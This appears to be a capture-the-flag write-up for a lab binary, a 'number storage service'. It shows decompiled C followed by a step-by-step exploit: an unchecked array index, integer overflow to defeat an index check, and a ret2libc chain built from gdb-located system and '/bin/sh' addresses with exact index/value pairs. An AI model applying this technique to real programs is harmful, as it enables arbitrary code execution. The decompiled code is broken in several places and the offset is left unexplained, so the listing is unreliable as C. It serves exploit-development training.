int get_unum(){
    unsigned int input;

    fflush(stdout);
    scanf("%u", input);
    
    clear_stdin();

    return(input);
}

int store_number(int *tab) {
    unsigned int input = 0; /* ebp-0x10 */
    unsigned int index = 0; /* ebp-0xc */

    printf(" Number: ");
    printf(" Index: ");

    index = get_unum();

    if ( index % 3 == 0 || (input >> 24) == 183 ) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");

        return 1;
    }
    tab[index] = input;
    return (0);
}

int read_number(int* tab){
    unsigned int input = 0; /* ebp-0xc */

    printf(" Index: ");

    input = get_unum(); 

    printf(" Number at data[%u] is %u\n", input, tab[input]);

    return 0;
}

int main(int argc, char **argv) {

    int ret = 0; /* esp + 0x1b4 */
    char buffer[20]; /* esp + 0x1b8 */
    int tab[100] = 0; /* esp + 0x24 */

    for (int i = 0; argv[i] != 0; i++) {
        memset(argv[i], 0, strlen(argv[i]) - 1);
    }   

    for (int i = 0; env[i] != 0, i++) {
        memset(env[i], 0, strlen(env[i] - 1));
    }

    puts("----------------------------------------------------\n"\
        "\n  Welcome to wil's crappy number storage service!   \n"\
        "----------------------------------------------------"\)

    while(true){
        printf("Input command: ");
        ret = 1;
        fgets(&buffer, 20, stdin);

        buffer[strlen(buffer) - 2] = 0;

        if (strncmp("store", buffer, 5) == 0) {
            ret = store_number(&tab);

        } else if (strncmp("read", buffer, 4) == 0) {
            ret = read_number(&tab);

        } else if (strncmp("quit", buffer, 4) == 0) {
            return 0;
        }

        if (ret != 0) {
            printf(" Failed to do %s command\n", buffer);

        } else {
            printf(" Completed %s command successfully\n", buffer);

        }

        bzero(buffer, 5 * 4);
        return 
    }
    return 0;

}

the program open an interface which allows us to store and read numbers in an array. We have 3 commands which are :
store (we give a index and a number to store)
read (read the number at a given index)
quit (quit program)

we can overwrite eip cause the program allocate an int array of 100 (int tab[100]) but when we use store and read the program never check the index.

if we want to overwrite eip we need to bypass that check (index % 3 == 0 ) in store_number, which prevent us to store in any index which is divisble by 3. hopefully the program dont do any other checks on the index. So we can input very large index that pass the (index % 3 == 0 ) check but when the program try to write on that index the integer will overflow on this line (tab[index] = input;) cause when the compilator try to find the address of tab[index] it does this calculation (see asm) targetAddr = tabAddr + (index * sizeof(tabType)) in this case tabType is an int so sizeof(int) == 4. So if we give an index larger than UNINT_MAX / 4 + 1 it will overflow ((UNINT_MAX / 4 + 1) * 4) = 0.

now we need to find the eip offset and cause we cant store our exploit in the env because the porgram flushs it we will need to store it in our tab

finding offset

offset = 114 explain after

building the exploit

we gonna use ret2lib exploit

in gdb when program is running we need to find system address and "/bin/sh" string:

system address:
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

for "/bin/sh" string we need to find the start of the libc address:

(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6

then we can search inside libc to find our string

(gdb) find 0xf7e42f70, +99999999, "/bin/sh"
0xf7f897ec

so we need to write 0xf7e6aed0 + 0x00000000 + 0xf7f897ec starting from index 114

index : 114 (1073741938)
0xf7e6aed0 -> 4159090384

index : 115 (1073741939)
0x00000000 -> 0

index : 116 (1073741940)
0xf7f897ec -> 4160264172